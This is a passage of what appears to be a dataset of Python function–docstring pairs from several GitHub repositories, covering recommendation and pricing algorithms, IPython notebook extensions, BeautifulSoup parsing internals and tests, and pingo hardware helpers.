"zouhongzhao/Programming-Collective-Intelligence-Source-Code", "stars": 370, "license": "None", "language": "python", "size": 214}
{"docstring": "# Get sorted distances\n", "func_signal": "def knnestimate(data,vec1,k=5):\n", "code": "dlist=getdistances(data,vec1)\navg=0.0\n\n# Take the average of the top k results\nfor i in range(k):\n  idx=dlist[i][1]\n  avg+=data[idx]['result']\navg=avg/k\nreturn avg", "path": "\u7b2c08\u7ae0 \u6784\u5efa\u4ef7\u683c\u6a21\u578b\\numpredict.py", "repo_name": "zouhongzhao/Programming-Collective-Intelligence-Source-Code", "stars": 370, "license": "None", "language": "python", "size": 214}
{"docstring": "# Construct URL for getRandomProfile\n", "func_signal": "def getrandomratings(c):\n", "code": "url=\"http://services.hotornot.com/rest/?app_key=%s\" % api_key\nurl+=\"&method=Rate.getRandomProfile&retrieve_num=%d\" % c\nurl+=\"&get_rate_info=true&meet_users_only=true\"\n\nf1=urllib2.urlopen(url).read()\n\ndoc=xml.dom.minidom.parseString(f1)\n\nemids=doc.getElementsByTagName('emid')\nratings=doc.getElementsByTagName('rating')\n\n# Combine the emids and ratings together into a list\nresult=[]\nfor e,r in zip(emids,ratings):\n  if r.firstChild!=None:\n    result.append((e.firstChild.data,r.firstChild.data))\nreturn result", "path": "\u7b2c07\u7ae0 \u51b3\u7b56\u6811\u5efa\u6a21\\hotornot.py", "repo_name": "zouhongzhao/Programming-Collective-Intelligence-Source-Code", "stars": 370, "license": "None", "language": "python", "size": 214}
{"docstring": "#convert x into svm_node, allocate a double array for return\n", "func_signal": "def predict_values_raw(self,x):\n", "code": "n = self.nr_class*(self.nr_class-1)//2\ndata = _convert_to_svm_node_array(x)\ndblarr = svmc.new_double(n)\nsvmc.svm_predict_values(self.model, data, dblarr)\nret = _double_array_to_list(dblarr, n)\nsvmc.delete_double(dblarr)\nsvmc.svm_node_array_destroy(data)\nreturn ret", "path": "\u7b2c09\u7ae0 \u9ad8\u9636\u5206\u7c7b \u6838\u65b9\u6cd5\u4e0eSVM\\svm.py", "repo_name": "zouhongzhao/Programming-Collective-Intelligence-Source-Code", "stars": 370, "license": "None", "language": "python", "size": 214}
{"docstring": "\"\"\"Initialize access to the API with ``user`` and ``passwd``.\n\n``codec`` sets the encoding of the arguments.\n\nThe ``api_request`` and ``xml_parser`` parameters by default point to\nfunctions within this package with standard implementations to\nrequest and parse a resource. See ``dlcs_api_request()`` and\n``dlcs_parse_xml()``. Note that ``api_request`` should return a\nfile-like instance with an HTTPMessage instance under ``info()``,\nsee ``urllib2.openurl`` for more info.\n\"\"\"\n", "func_signal": "def __init__(self, user, passwd, codec='iso-8859-1', api_request=dlcs_api_request, xml_parser=dlcs_parse_xml):\n", "code": "assert user != \"\"\nself.user = user\nself.passwd = passwd\nself.codec = codec\n\n# Implement communication to server and parsing of respons messages:\nassert callable(api_request)\nself._api_request = api_request\nassert callable(xml_parser)\nself._parse_response = xml_parser", "path": "\u7b2c02\u7ae0 \u63d0\u4f9b\u63a8\u8350\\pydelicious.py", "repo_name": "zouhongzhao/Programming-Collective-Intelligence-Source-Code", "stars": 370, "license": "None", "language": "python", "size": 214}
{"docstring": "# Parse the feed\n", "func_signal": "def getwordcounts(url):\n", "code": "d=feedparser.parse(url)\nwc={}\n\n# Loop over all the entries\nfor e in d.entries:\n  if 'summary' in e: summary=e.summary\n  else: summary=e.description\n\n  # Extract a list of words\n  words=getwords(e.title+' '+summary)\n  for word in words:\n    wc.setdefault(word,0)\n    wc[word]+=1\nreturn d.feed.title,wc", "path": "\u7b2c03\u7ae0 \u53d1\u73b0\u7fa4\u7ec4\\generatefeedvector.py", "repo_name": "zouhongzhao/Programming-Collective-Intelligence-Source-Code", "stars": 370, "license": "None", "language": "python", "size": 214}
{"docstring": "\"\"\"Convert a figure to svg or png for inline display.\"\"\"\n", "func_signal": "def print_figure(fig, fmt='png', dpi=None):\n", "code": "import matplotlib\nfc = fig.get_facecolor()\nec = fig.get_edgecolor()\nbytes_io = BytesIO()\ndpi = dpi or matplotlib.rcParams['savefig.dpi']\nfig.canvas.print_figure(bytes_io, format=fmt, dpi=dpi,\n                        bbox_inches='tight',\n                        facecolor=fc, edgecolor=ec,\n)\ndata = bytes_io.getvalue()\nreturn data", "path": "extensions\\retina.py", "repo_name": "minrk/ipython_extensions", "stars": 422, "license": "other", "language": "python", "size": 96}
{"docstring": "\"\"\"cleanup any new variables defined in the cell\n\navoids UnboundLocals that might show up in %%closure\n\nchanges to existing variables are not affected\n\"\"\"\n", "func_signal": "def forget(line, cell):\n", "code": "ip = get_ipython()\nbefore = set(ip.user_ns)\nip.run_cell(cell)\nafter = set(ip.user_ns)\nfor key in after.difference(before):\n    ip.user_ns.pop(key)", "path": "extensions\\closure.py", "repo_name": "minrk/ipython_extensions", "stars": 422, "license": "other", "language": "python", "size": 96}
{"docstring": "\"\"\"render figure to 2x PNG via HTML\"\"\"\n", "func_signal": "def png2x(fig):\n", "code": "import matplotlib\nif not fig.axes and not fig.lines:\n    return\n# double DPI\ndpi = 2 * matplotlib.rcParams['savefig.dpi']\npngbytes = print_figure(fig, fmt='png', dpi=dpi)\nx,y = pngxy(pngbytes)\nx2x = x // 2\ny2x = y // 2\npng64 = encodestring(pngbytes).decode('ascii')\nreturn u\"<img src='data:image/png;base64,%s' width=%i height=%i/>\" % (png64, x2x, y2x)", "path": "extensions\\retina.py", "repo_name": "minrk/ipython_extensions", "stars": 422, "license": "other", "language": "python", "size": 96}
{"docstring": "\"\"\"convert a PIL Image to png bytes\"\"\"\n", "func_signal": "def pil2imgdata(img, format='PNG'):\n", "code": "fp = BytesIO()\nimg.save(fp, format=format)\nreturn fp.getvalue()", "path": "extensions\\pil_display.py", "repo_name": "minrk/ipython_extensions", "stars": 422, "license": "other", "language": "python", "size": 96}
{"docstring": "\"\"\"Writes the content of the cell to a file and then executes the cell.\n\nUsage:\n  %%writeandexecute [-d] -i <identifier> <filename>\n  code\n  code...\n\nOptions:\n-i <identifier>: surrounds the code written to the file with a line \ncontaining the identifier. The use of an identifier enables you to easily\noverwrite a given code section in the output file.\n\n<filename>: the file to which the code should be written. Can be \nspecified without a extension and can also include a directory \n(`dir/file`)\n\n-d: Write some debugging output\nDefault: -- (no debugging output)\n\nThis magic can be used to write the content of a cell to a .py \nfile and afterwards execute the cell. This can be used as a \nreplacement for the --script parameter to the notebook server.\n\nCode is replaced on the next execution (using the needed identifier) \nand other code can be appended by using the same file name.\n\nExamples\n--------\n%%writeandexecute -i my_code_block functions.py\nprint \"Hello world\"\n\nThis would create a file \"functions.py\" with the following content\n```\n# -*- coding: utf-8 -*-\n\n\n# -- ==my_code_block== --\nprint \"Hello world\"\n\n# -- ==my_code_block== --\n```\n\nCell content is transformed, so %%magic commands are executed, but \n`get_ipython()` must be available.\n\"\"\"\n\n", "func_signal": "def writeandexecute(self, parameter_s='', cell=None):\n", "code": "opts,args = self.parse_options(parameter_s,'i:d')\nif cell is None:\n    raise UsageError('Nothing to save!')\nif not ('i' in opts) or not opts['i']:\n    raise UsageError('Missing indentifier: include \"-i=<indentifier>\"')\nidentifier = opts['i']\ndebug = False if not \"d\" in opts else True\nif not args:\n    raise UsageError('Missing filename')\nfilename = args\ncode_content = self.shell.input_transformer_manager.transform_cell(cell)\nself._save_to_file(filename, identifier, code_content, debug=debug)\n\nip = get_ipython()\nip.run_cell(cell)", "path": "extensions\\writeandexecute.py", "repo_name": "minrk/ipython_extensions", "stars": 422, "license": "other", "language": "python", "size": 96}
{"docstring": "\"\"\"Call the same code as `foo?` to compute reprs of functions\n\nParameters\n----------\nobj:\n    The object being formatted\np:\n    The pretty formatter instance\ncycle: \n    Whether a cycle has been detected (unused)\n\"\"\"\n", "func_signal": "def pinfo_function(obj, p, cycle):\n", "code": "text = get_ipython().inspector._format_info(obj, detail_level=1)\np.text(text)", "path": "extensions\\pretty_func_repr.py", "repo_name": "minrk/ipython_extensions", "stars": 422, "license": "other", "language": "python", "size": 96}
{"docstring": "\"\"\"display an OpenCV cvmat object as an image\"\"\"\n", "func_signal": "def display_cv_image(cvimg):\n", "code": "import numpy as np\nreturn array2imgdata_fs(np.asarray(cvimg))", "path": "extensions\\pil_display.py", "repo_name": "minrk/ipython_extensions", "stars": 422, "license": "other", "language": "python", "size": 96}
{"docstring": "\"\"\"enable retina figures\"\"\"\n", "func_signal": "def enable_retina(ip):\n", "code": "from matplotlib.figure import Figure\n\n\n# unregister existing formatter(s):\npng_formatter = ip.display_formatter.formatters['image/png']\npng_formatter.type_printers.pop(Figure, None)\nsvg_formatter = ip.display_formatter.formatters['image/svg+xml']\nsvg_formatter.type_printers.pop(Figure, None)\n\n# register png2x as HTML formatter\nhtml_formatter = ip.display_formatter.formatters['text/html']\nhtml_formatter.for_type(Figure, png2x)", "path": "extensions\\retina.py", "repo_name": "minrk/ipython_extensions", "stars": 422, "license": "other", "language": "python", "size": 96}
{"docstring": "\"\"\"Start a timer\n\nUsage:\n\n    %tic [label]\n\n\"\"\"\n", "func_signal": "def tic(self, line):\n", "code": "label = line.strip() or None\nnow = self.time()\nif label in self.timers:\n    # %tic on an existing name prints the time,\n    # but does not affect the stack\n    self.print_time(now - self.timers[label], label)\n    return\n\nif label:\n    self.timers[label] = now\nself.tics.insert(0, self.time())\nself.labels.insert(0, label)", "path": "extensions\\timers.py", "repo_name": "minrk/ipython_extensions", "stars": 422, "license": "other", "language": "python", "size": 96}
{"docstring": "\"\"\"get png data via filesystem, using cv2.imwrite\n\nThis is much faster than in-memory conversion with PIL on the rPi for some reason.\n\"\"\"\n", "func_signal": "def array2imgdata_fs(A, format='PNG'):\n", "code": "import cv2\nfname = os.path.join(tempfile.gettempdir(), \"_ipdisplay.%s\" % format)\ncv2.imwrite(fname, A)\nwith open(fname) as f:\n    data = f.read()\nos.unlink(fname)\nreturn data", "path": "extensions\\pil_display.py", "repo_name": "minrk/ipython_extensions", "stars": 422, "license": "other", "language": "python", "size": 96}
{"docstring": "\"\"\"get png data from array via converting to PIL Image\"\"\"\n", "func_signal": "def array2imgdata_pil(A, format='PNG'):\n", "code": "from PIL import Image\nif A.shape[2] == 3:\n    mode = 'RGB'\nelif A.shape[2] == 4:\n    mode = 'RGBA'\nelse:\n    mode = 'L'\nimg = Image.frombytes(mode, A.shape[:2][::-1], A.tostring())\nreturn pil2imgdata(img, format)", "path": "extensions\\pil_display.py", "repo_name": "minrk/ipython_extensions", "stars": 422, "license": "other", "language": "python", "size": 96}
{"docstring": "\"\"\"read the width/height from a PNG header\"\"\"\n", "func_signal": "def pngxy(data):\n", "code": "ihdr = data.index(b'IHDR')\n# next 8 bytes are width/height\nw4h4 = data[ihdr+4:ihdr+12]\nreturn struct.unpack('>ii', w4h4)", "path": "extensions\\retina.py", "repo_name": "minrk/ipython_extensions", "stars": 422, "license": "other", "language": "python", "size": 96}
{"docstring": "\"\"\"Schedule notebook autosave\n\nUsage:\n\n    %autosave [interval]\n\nIf `interval` is given, IPython will autosave the notebook every `interval` seconds.\nIf `interval` is 0, autosave is disabled.\n\nIf no interval is specified, autosave is toggled.\n\"\"\"\n", "func_signal": "def autosave(self, line):\n", "code": "line = line.strip()\nif not line:\n    # empty line, toggle\n    self.enabled = bool(1 - self.enabled)\nelse:\n    interval = int(line)\n    if interval:\n        self.enabled = True\n        self.interval = interval\n    else:\n        self.enabled = False\n\nself.autosave_js(self.enabled * self.interval)", "path": "extensions\\autosave.py", "repo_name": "minrk/ipython_extensions", "stars": 422, "license": "other", "language": "python", "size": 96}
{"docstring": "\"\"\"Load the extension in IPython.\"\"\"\n", "func_signal": "def load_ipython_extension(ip):\n", "code": "if \"autosave\" in ip.magics_manager.magics['line']:\n    print (\"IPython 1.0 has autosave, this extension is obsolete\")\n    return\nip.register_magics(AutoSaveMagics)\nprint (\"Usage: %autosave [seconds]\")", "path": "extensions\\autosave.py", "repo_name": "minrk/ipython_extensions", "stars": 422, "license": "other", "language": "python", "size": 96}
{"docstring": "\"\"\"time.clock seems preferable on Windows\"\"\"\n", "func_signal": "def time():\n", "code": "if sys.platform.startswith('win'):\n    return time.clock()\nelse:\n    return time.time()", "path": "extensions\\timers.py", "repo_name": "minrk/ipython_extensions", "stars": 422, "license": "other", "language": "python", "size": 96}
{"docstring": "\"\"\"unregister pinfo_function\"\"\"\n", "func_signal": "def unload_ipython_extension(ip):\n", "code": "pprinter = ip.display_formatter.formatters['text/plain']\nfor t, f in _save_types.items():\n    pprinter.for_type(t, f)\n\n_save_types.clear()", "path": "extensions\\pretty_func_repr.py", "repo_name": "minrk/ipython_extensions", "stars": 422, "license": "other", "language": "python", "size": 96}
{"docstring": "\"\"\"register pinfo_function as the custom plain-text repr for funtion types\"\"\"\n", "func_signal": "def load_ipython_extension(ip):\n", "code": "pprinter = ip.display_formatter.formatters['text/plain']\n\nfor t in (types.FunctionType,\n          types.BuiltinMethodType,\n          types.BuiltinFunctionType):\n    f = pprinter.for_type(t, pinfo_function)\n    _save_types[t] = f", "path": "extensions\\pretty_func_repr.py", "repo_name": "minrk/ipython_extensions", "stars": 422, "license": "other", "language": "python", "size": 96}
{"docstring": "\"\"\"Stop and print the timer started by the last call to %tic\n\nUsage:\n\n    %toc\n\n\"\"\"\n", "func_signal": "def toc(self, line):\n", "code": "now = self.time()\ntic = self.tics.pop(0)\nlabel = self.labels.pop(0)\nself.timers.pop(label, None)\n\nself.print_time(now - tic, label)", "path": "extensions\\timers.py", "repo_name": "minrk/ipython_extensions", "stars": 422, "license": "other", "language": "python", "size": 96}
{"docstring": "\"\"\"If an array looks like RGB[A] data, display it as an image.\"\"\"\n", "func_signal": "def display_image_array(a):\n", "code": "import numpy as np\nif len(a.shape) != 3 or a.shape[2] not in {3,4} or a.dtype != np.uint8:\n    return\nmd = {\n    'width': a.shape[1] // 2\n}\nreturn (array2imgdata_pil(a), md)", "path": "extensions\\pil_display.py", "repo_name": "minrk/ipython_extensions", "stars": 422, "license": "other", "language": "python", "size": 96}
{"docstring": "\"\"\"run the cell in a function, generating a closure\n\navoids affecting the user's namespace\n\"\"\"\n", "func_signal": "def closure(line, cell):\n", "code": "ip = get_ipython()\nfunc_name = \"_closure_magic_f\"\nblock = '\\n'.join([\n    \"def %s():\" % func_name,\n    indent(cell),\n    \"%s()\" % func_name\n])\nip.run_cell(block)\nip.user_ns.pop(func_name, None)", "path": "extensions\\closure.py", "repo_name": "minrk/ipython_extensions", "stars": 422, "license": "other", "language": "python", "size": 96}
{"docstring": "\"\"\"Substitute XML entities for special XML characters.\n\n:param value: A string to be substituted. The less-than sign\n  will become &lt;, the greater-than sign will become &gt;,\n  and any ampersands will become &amp;. If you want ampersands\n  that appear to be part of an entity definition to be left\n  alone, use substitute_xml_containing_entities() instead.\n\n:param make_quoted_attribute: If True, then the string will be\n quoted, as befits an attribute value.\n\"\"\"\n# Escape angle brackets and ampersands.\n", "func_signal": "def substitute_xml(cls, value, make_quoted_attribute=False):\n", "code": "value = cls.AMPERSAND_OR_BRACKET.sub(\n    cls._substitute_xml_entity, value)\n\nif make_quoted_attribute:\n    value = cls.quoted_attribute_value(value)\nreturn value", "path": "src\\bs4\\dammit.py", "repo_name": "yanzhou/CnkiSpider", "stars": 511, "license": "None", "language": "python", "size": 201}
{"docstring": "# You can pass in a string.\n", "func_signal": "def test_beautifulsoup_constructor_does_lookup(self):\n", "code": "BeautifulSoup(\"\", features=\"html\")\n# Or a list of strings.\nBeautifulSoup(\"\", features=[\"html\", \"fast\"])\n\n# You'll get an exception if BS can't find an appropriate\n# builder.\nself.assertRaises(ValueError, BeautifulSoup,\n                  \"\", features=\"no-such-feature\")", "path": "src\\bs4\\tests\\test_builder_registry.py", "repo_name": "yanzhou/CnkiSpider", "stars": 511, "license": "None", "language": "python", "size": 201}
{"docstring": "#print \"End tag: \" + name\n", "func_signal": "def handle_endtag(self, name, nsprefix=None):\n", "code": "self.endData()\nself._popToTag(name, nsprefix)", "path": "src\\bs4\\__init__.py", "repo_name": "yanzhou/CnkiSpider", "stars": 511, "license": "None", "language": "python", "size": 201}
{"docstring": "\"\"\"Move all of this tag's children into another tag.\"\"\"\n", "func_signal": "def reparentChildren(self, new_parent):\n", "code": "element = self.element\nnew_parent_element = new_parent.element\n# Determine what this tag's next_element will be once all the children\n# are removed.\nfinal_next_element = element.next_sibling\n\nnew_parents_last_descendant = new_parent_element._last_descendant(False, False)\nif len(new_parent_element.contents) > 0:\n    # The new parent already contains children. We will be\n    # appending this tag's children to the end.\n    new_parents_last_child = new_parent_element.contents[-1]\n    new_parents_last_descendant_next_element = new_parents_last_descendant.next_element\nelse:\n    # The new parent contains no children.\n    new_parents_last_child = None\n    new_parents_last_descendant_next_element = new_parent_element.next_element\n\nto_append = element.contents\nappend_after = new_parent.element.contents\nif len(to_append) > 0:\n    # Set the first child's previous_element and previous_sibling\n    # to elements within the new parent\n    first_child = to_append[0]\n    first_child.previous_element = new_parents_last_descendant\n    first_child.previous_sibling = new_parents_last_child\n\n    # Fix the last child's next_element and next_sibling\n    last_child = to_append[-1]\n    last_child.next_element = new_parents_last_descendant_next_element\n    last_child.next_sibling = None\n\nfor child in to_append:\n    child.parent = new_parent_element\n    new_parent_element.contents.append(child)\n\n# Now that this element has no children, change its .next_element.\nelement.contents = []\nelement.next_element = final_next_element", "path": "src\\bs4\\builder\\_html5lib.py", "repo_name": "yanzhou/CnkiSpider", "stars": 511, "license": "None", "language": "python", "size": 201}
{"docstring": "\"\"\"Make a value into a quoted XML attribute, possibly escaping it.\n\n Most strings will be quoted using double quotes.\n\n  Bob's Bar -> \"Bob's Bar\"\n\n If a string contains double quotes, it will be quoted using\n single quotes.\n\n  Welcome to \"my bar\" -> 'Welcome to \"my bar\"'\n\n If a string contains both single and double quotes, the\n double quotes will be escaped, and the string will be quoted\n using double quotes.\n\n  Welcome to \"Bob's Bar\" -> \"Welcome to &quot;Bob's bar&quot;\n\"\"\"\n", "func_signal": "def quoted_attribute_value(self, value):\n", "code": "quote_with = '\"'\nif '\"' in value:\n    if \"'\" in value:\n        # The string contains both single and double\n        # quotes.  Turn the double quotes into\n        # entities. We quote the double quotes rather than\n        # the single quotes because the entity name is\n        # \"&quot;\" whether this is HTML or XML.  If we\n        # quoted the single quotes, we'd have to decide\n        # between &apos; and &squot;.\n        replace_with = \"&quot;\"\n        value = value.replace('\"', replace_with)\n    else:\n        # There are double quotes but no single quotes.\n        # We can use single quotes to quote the attribute.\n        quote_with = \"'\"\nreturn quote_with + value + quote_with", "path": "src\\bs4\\dammit.py", "repo_name": "yanzhou/CnkiSpider", "stars": 511, "license": "None", "language": "python", "size": 201}
{"docstring": "\"\"\"Pops the tag stack up to and including the most recent\ninstance of the given tag. If inclusivePop is false, pops the tag\nstack up to but *not* including the most recent instqance of\nthe given tag.\"\"\"\n#print \"Popping to %s\" % name\n", "func_signal": "def _popToTag(self, name, nsprefix=None, inclusivePop=True):\n", "code": "if name == self.ROOT_TAG_NAME:\n    # The BeautifulSoup object itself can never be popped.\n    return\n\nmost_recently_popped = None\n\nstack_size = len(self.tagStack)\nfor i in range(stack_size - 1, 0, -1):\n    t = self.tagStack[i]\n    if (name == t.name and nsprefix == t.prefix):\n        if inclusivePop:\n            most_recently_popped = self.popTag()\n        break\n    most_recently_popped = self.popTag()\n\nreturn most_recently_popped", "path": "src\\bs4\\__init__.py", "repo_name": "yanzhou/CnkiSpider", "stars": 511, "license": "None", "language": "python", "size": 201}
{"docstring": "#print \"Push\", tag.name\n", "func_signal": "def pushTag(self, tag):\n", "code": "if self.currentTag:\n    self.currentTag.contents.append(tag)\nself.tagStack.append(tag)\nself.currentTag = self.tagStack[-1]\nif tag.name in self.builder.preserve_whitespace_tags:\n    self.preserve_whitespace_tag_stack.append(tag)", "path": "src\\bs4\\__init__.py", "repo_name": "yanzhou/CnkiSpider", "stars": 511, "license": "None", "language": "python", "size": 201}
{"docstring": "\"\"\"Used with a regular expression to substitute the\nappropriate XML entity for an XML special character.\"\"\"\n", "func_signal": "def _substitute_xml_entity(cls, matchobj):\n", "code": "entity = cls.CHARACTER_TO_XML_ENTITY[matchobj.group(0)]\nreturn \"&%s;\" % entity", "path": "src\\bs4\\dammit.py", "repo_name": "yanzhou/CnkiSpider", "stars": 511, "license": "None", "language": "python", "size": 201}
{"docstring": "\"\"\"Push a start tag on to the stack.\n\nIf this method returns None, the tag was rejected by the\nSoupStrainer. You should proceed as if the tag had not occured\nin the document. For instance, if this was a self-closing tag,\ndon't call handle_endtag.\n\"\"\"\n\n# print \"Start tag %s: %s\" % (name, attrs)\n", "func_signal": "def handle_starttag(self, name, namespace, nsprefix, attrs):\n", "code": "self.endData()\n\nif (self.parse_only and len(self.tagStack) <= 1\n    and (self.parse_only.text\n         or not self.parse_only.search_tag(name, attrs))):\n    return None\n\ntag = Tag(self, self.builder, name, namespace, nsprefix, attrs,\n          self.currentTag, self._most_recent_element)\nif tag is None:\n    return tag\nif self._most_recent_element:\n    self._most_recent_element.next_element = tag\nself._most_recent_element = tag\nself.pushTag(tag)\nreturn tag", "path": "src\\bs4\\__init__.py", "repo_name": "yanzhou/CnkiSpider", "stars": 511, "license": "None", "language": "python", "size": 201}
{"docstring": "\"\"\"Randomly generate an invalid HTML document.\"\"\"\n", "func_signal": "def rdoc(num_elements=1000):\n", "code": "tag_names = ['p', 'div', 'span', 'i', 'b', 'script', 'table']\nelements = []\nfor i in range(num_elements):\n    choice = random.randint(0,3)\n    if choice == 0:\n        # New tag.\n        tag_name = random.choice(tag_names)\n        elements.append(\"<%s>\" % tag_name)\n    elif choice == 1:\n        elements.append(rsentence(random.randint(1,4)))\n    elif choice == 2:\n        # Close a tag.\n        tag_name = random.choice(tag_names)\n        elements.append(\"</%s>\" % tag_name)\nreturn \"<html>\" + \"\\n\".join(elements) + \"</html>\"", "path": "src\\bs4\\diagnose.py", "repo_name": "yanzhou/CnkiSpider", "stars": 511, "license": "None", "language": "python", "size": 201}
{"docstring": "\"\"\"Create a new NavigableString associated with this soup.\"\"\"\n", "func_signal": "def new_string(self, s, subclass=NavigableString):\n", "code": "navigable = subclass(s)\nnavigable.setup()\nreturn navigable", "path": "src\\bs4\\__init__.py", "repo_name": "yanzhou/CnkiSpider", "stars": 511, "license": "None", "language": "python", "size": 201}
{"docstring": "\"\"\"Replace certain Unicode characters with named HTML entities.\n\nThis differs from data.encode(encoding, 'xmlcharrefreplace')\nin that the goal is to make the result more readable (to those\nwith ASCII displays) rather than to recover from\nerrors. There's absolutely nothing wrong with a UTF-8 string\ncontaing a LATIN SMALL LETTER E WITH ACUTE, but replacing that\ncharacter with \"&eacute;\" will make it more readable to some\npeople.\n\"\"\"\n", "func_signal": "def substitute_html(cls, s):\n", "code": "return cls.CHARACTER_TO_HTML_ENTITY_RE.sub(\n    cls._substitute_html_entity, s)", "path": "src\\bs4\\dammit.py", "repo_name": "yanzhou/CnkiSpider", "stars": 511, "license": "None", "language": "python", "size": 201}
{"docstring": "# The html5lib tree builder does not support SoupStrainers.\n", "func_signal": "def test_soupstrainer(self):\n", "code": "strainer = SoupStrainer(\"b\")\nmarkup = \"<p>A <b>bold</b> statement.</p>\"\nwith warnings.catch_warnings(record=True) as w:\n    soup = self.soup(markup, parse_only=strainer)\nself.assertEqual(\n    soup.decode(), self.document_for(markup))\n\nself.assertTrue(\n    \"the html5lib tree builder doesn't support parse_only\" in\n    str(w[0].message))", "path": "src\\bs4\\tests\\test_html5lib.py", "repo_name": "yanzhou/CnkiSpider", "stars": 511, "license": "None", "language": "python", "size": 201}
{"docstring": "\"\"\"Given a document, tries to find its declared encoding.\n\nAn XML encoding is declared at the beginning of the document.\n\nAn HTML encoding is declared in a <meta> tag, hopefully near the\nbeginning of the document.\n\"\"\"\n", "func_signal": "def find_declared_encoding(cls, markup, is_html=False, search_entire_document=False):\n", "code": "if search_entire_document:\n    xml_endpos = html_endpos = len(markup)\nelse:\n    xml_endpos = 1024\n    html_endpos = max(2048, int(len(markup) * 0.05))\n    \ndeclared_encoding = None\ndeclared_encoding_match = xml_encoding_re.search(markup, endpos=xml_endpos)\nif not declared_encoding_match and is_html:\n    declared_encoding_match = html_meta_re.search(markup, endpos=html_endpos)\nif declared_encoding_match is not None:\n    declared_encoding = declared_encoding_match.groups()[0].decode(\n        'ascii')\nif declared_encoding:\n    return declared_encoding.lower()\nreturn None", "path": "src\\bs4\\dammit.py", "repo_name": "yanzhou/CnkiSpider", "stars": 511, "license": "None", "language": "python", "size": 201}
{"docstring": "# Convert the document to Unicode.\n", "func_signal": "def _feed(self):\n", "code": "self.builder.reset()\n\nself.builder.feed(self.markup)\n# Close out any unfinished strings and close all the open tags.\nself.endData()\nwhile self.currentTag.name != self.ROOT_TAG_NAME:\n    self.popTag()", "path": "src\\bs4\\__init__.py", "repo_name": "yanzhou/CnkiSpider", "stars": 511, "license": "None", "language": "python", "size": 201}
{"docstring": "\"\"\"Add an object to the parse tree.\"\"\"\n", "func_signal": "def object_was_parsed(self, o, parent=None, most_recent_element=None):\n", "code": "parent = parent or self.currentTag\nmost_recent_element = most_recent_element or self._most_recent_element\no.setup(parent, most_recent_element)\n\nif most_recent_element is not None:\n    most_recent_element.next_element = o\nself._most_recent_element = o\nparent.contents.append(o)", "path": "src\\bs4\\__init__.py", "repo_name": "yanzhou/CnkiSpider", "stars": 511, "license": "None", "language": "python", "size": 201}
{"docstring": "\"\"\"Yield a number of encodings that might work for this markup.\"\"\"\n", "func_signal": "def encodings(self):\n", "code": "tried = set()\nfor e in self.override_encodings:\n    if self._usable(e, tried):\n        yield e\n\n# Did the document originally start with a byte-order mark\n# that indicated its encoding?\nif self._usable(self.sniffed_encoding, tried):\n    yield self.sniffed_encoding\n\n# Look within the document for an XML or HTML encoding\n# declaration.\nif self.declared_encoding is None:\n    self.declared_encoding = self.find_declared_encoding(\n        self.markup, self.is_html)\nif self._usable(self.declared_encoding, tried):\n    yield self.declared_encoding\n\n# Use third-party character set detection to guess at the\n# encoding.\nif self.chardet_encoding is None:\n    self.chardet_encoding = chardet_dammit(self.markup)\nif self._usable(self.chardet_encoding, tried):\n    yield self.chardet_encoding\n\n# As a last-ditch effort, try utf-8 and windows-1252.\nfor e in ('utf-8', 'windows-1252'):\n    if self._usable(e, tried):\n        yield e", "path": "src\\bs4\\dammit.py", "repo_name": "yanzhou/CnkiSpider", "stars": 511, "license": "None", "language": "python", "size": 201}
{"docstring": "\"\"\"Print out the lxml events that occur during parsing.\n\nThis lets you see how lxml parses a document when no Beautiful\nSoup code is running.\n\"\"\"\n", "func_signal": "def lxml_trace(data, html=True, **kwargs):\n", "code": "from lxml import etree\nfor event, element in etree.iterparse(StringIO(data), html=html, **kwargs):\n    print(\"%s, %4s, %s\" % (event, element.tag, element.text))", "path": "src\\bs4\\diagnose.py", "repo_name": "yanzhou/CnkiSpider", "stars": 511, "license": "None", "language": "python", "size": 201}
{"docstring": "\"\"\"html5lib inserts <tbody> tags where other parsers don't.\"\"\"\n", "func_signal": "def test_correctly_nested_tables(self):\n", "code": "markup = ('<table id=\"1\">'\n          '<tr>'\n          \"<td>Here's another table:\"\n          '<table id=\"2\">'\n          '<tr><td>foo</td></tr>'\n          '</table></td>')\n\nself.assertSoupEquals(\n    markup,\n    '<table id=\"1\"><tbody><tr><td>Here\\'s another table:'\n    '<table id=\"2\"><tbody><tr><td>foo</td></tr></tbody></table>'\n    '</td></tr></tbody></table>')\n\nself.assertSoupEquals(\n    \"<table><thead><tr><td>Foo</td></tr></thead>\"\n    \"<tbody><tr><td>Bar</td></tr></tbody>\"\n    \"<tfoot><tr><td>Baz</td></tr></tfoot></table>\")", "path": "src\\bs4\\tests\\test_html5lib.py", "repo_name": "yanzhou/CnkiSpider", "stars": 511, "license": "None", "language": "python", "size": 201}
{"docstring": "\"\"\"\n\u83b7\u53d6\u914d\u7f6e\nkey:\u914d\u7f6e\u9879\u952e\u540d\nparent:\u4e0a\u7ea7\u952e\u540d\uff0csearch\uff0clist\u6216None\n\"\"\"\n", "func_signal": "def get(self, key, parent=None):\n", "code": "if key and key in self.config.keys():\n    return self.config[key]\nelif parent in [\"list\", \"search\", \"headers\", \"listPageOne\"]:\n    return self.config[parent][key]\nelse:\n    return None", "path": "src\\Config.py", "repo_name": "yanzhou/CnkiSpider", "stars": 511, "license": "None", "language": "python", "size": 201}
{"docstring": "# self.firmata_client.close() has sys.exit(0)\n", "func_signal": "def cleanup(self):\n", "code": "if hasattr(self, 'PyMata'):\n    try:\n        self.firmata_client.transport.close()\n    except AttributeError:\n        pass", "path": "pingo\\arduino\\firmata.py", "repo_name": "pingo-io/pingo-py", "stars": 257, "license": "mit", "language": "python", "size": 30387}
{"docstring": "\"\"\"\n:param led: Led instance to to blink\n:param times: number of times to blink (0=forever)\n:param on_delay: delay while LED is on\n:param off_delay: delay while LED is off\n\"\"\"\n", "func_signal": "def __init__(self, led, times, on_delay, off_delay):\n", "code": "self.led = led\nself.led_pin_state_initial = self.led.pin.state\nself.active = True\nself.forever = times == 0\nself.times_remaining = times\nself.on_delay = on_delay\nself.off_delay = off_delay if off_delay is not None else on_delay\nself.led.off()", "path": "pingo\\parts\\led.py", "repo_name": "pingo-io/pingo-py", "stars": 257, "license": "mit", "language": "python", "size": 30387}
